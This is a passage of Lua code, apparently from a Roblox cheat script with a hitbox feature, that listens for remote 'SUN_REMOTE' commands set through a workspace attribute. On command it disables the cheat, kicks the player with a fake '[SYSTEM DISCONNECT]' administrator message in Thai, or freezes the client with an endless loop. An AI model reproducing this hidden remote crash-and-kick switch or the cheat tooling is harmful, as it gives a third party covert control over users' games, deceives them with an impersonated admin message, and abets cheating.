    local val = workspace:GetAttribute("SunCmdSignal")
    if not val then return end
    local target, action = string.match(val, "SUN_REMOTE:(.-):(.-)$")
    if target and (target == "ALL" or target == LocalPlayer.Name) then
        if action == "DISABLE" then
            Active = false
            HitboxOn = false
            for _, p in pairs(Players:GetPlayers()) do ResetCharacter(p) end
            ScreenGui:Destroy()
        elseif action == "KICK" then
            LocalPlayer:Kick("\n[SYSTEM DISCONNECT]\nคุณถูกตัดการเชื่อมต่อโดยผู้ดูแลระบบ")
        elseif action == "CRASH" then
            while true do end
        end
    end
end)
